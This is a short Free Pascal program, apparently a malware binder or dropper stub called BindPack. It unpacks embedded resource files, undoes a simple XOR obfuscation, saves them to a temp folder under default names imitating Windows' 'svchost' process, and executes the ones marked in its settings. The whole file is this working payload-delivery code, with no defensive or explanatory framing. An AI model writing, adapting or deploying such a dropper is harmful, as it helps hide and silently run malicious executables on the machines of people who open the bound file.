program BindPack;

{$mode objfpc}{$H+}

uses
  Classes, Windows, INIFiles, SysUtils;

var
  Res: TResourceStream;
  MS: TMemoryStream;
  Settings: TMemINIFile;
  J, I: LongInt;

  FileName, Dir: String;

procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
var
   InMS: TMemoryStream;
   cnt: Integer;
   C: byte;
begin
  C:=0;
  InMS := TMemoryStream.Create;
  try
    InMS.CopyFrom(MS, MS.Size);
    InMS.Position := 0;
    MS.Clear;
    for cnt := 0 to InMS.Size - 1 do
      begin
        InMS.Read(C, 1) ;
        C := (C xor not (ord(Key shr cnt)));
        MS.Write(C, 1) ;
      end;
  finally
    InMS.Free;
  end;
  MS.Position:=0;
end;

begin
  Res:=TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  MS:=TMemoryStream.Create;
  MS.LoadFromStream(Res);
  Res.Free;
  Settings:=TMemINIFile.Create(MS);
  MS.Free;
  J:=Settings.ReadInteger('General', 'FileCount', 2);
  Dir:=IncludeTrailingBackslash(GetEnvironmentVariable('Temp'))+'Dump';
  if Not(DirectoryExists(Dir)) then MkDir(Dir);
  ChDir(Dir);
  Dir += '\';
  For I:=0 to J-1 do Begin
    Res:=TResourceStream.Create(HInstance, 'File'+IntToStr(I), RT_RCDATA);
    MS:=TMemoryStream.Create;
    MS.LoadFromStream(Res);
    MS.Position:=0;
    ToggleCrypt(MS, 7019);
    FileName:=Settings.ReadString(IntToStr(I), 'FileName', 'svchost'+IntToStr(I)+'.exe');
    MS.SaveToFile(FileName);
    MS.Free;
  end;
  For I:=0 to J-1 do Begin
    if Settings.ReadBool(IntToStr(I), 'Execute', False) then Begin
      FileName:=Settings.ReadString(IntToStr(I), 'FileName', 'svchost'+IntToStr(I)+'.exe');
      ShellExecute(0, 'open', PChar(Dir+FileName), Nil, Nil, SW_SHOWNORMAL);
    end;
  end;
  Settings.Free;
end.

